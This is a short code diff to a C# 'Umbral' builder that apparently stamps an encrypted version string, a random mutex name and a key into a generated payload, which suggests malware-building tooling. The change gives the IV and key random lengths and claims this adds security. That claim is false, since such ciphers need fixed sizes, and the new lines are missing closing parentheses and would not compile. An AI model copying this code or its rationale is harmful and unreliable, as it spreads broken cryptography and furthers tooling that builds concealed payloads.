@@ -58,9 +58,12 @@ namespace Umbral.builder.Build
             }
 
             textBox.Clear();
+            
+            Random random = new Random(); // create random object
 
-            byte[] iv = Encoding.UTF8.GetBytes(GenerateRandomString(12));
-            byte[] key = Encoding.UTF8.GetBytes(GenerateRandomString(32));
+            // use random to make a random length for the iv, key for added security.
+            byte[] iv = Encoding.UTF8.GetBytes(GenerateRandomString(random.Next(12, 80));
+            byte[] key = Encoding.UTF8.GetBytes(GenerateRandomString(random.Next(32, 80));
 
             try
             {
@@ -92,7 +95,8 @@ namespace Umbral.builder.Build
                                 instruction.Operand = Encrypt(Version, key, iv);
                                 break;
                             case 3: // mutex 
-                                instruction.Operand = GenerateRandomString(20);
+                                // And here too
+                                instruction.Operand = GenerateRandomString(random.Next(20, 80));
                                 break;
                             case 4: // key 
                                 instruction.Operand = Convert.ToBase64String(key);
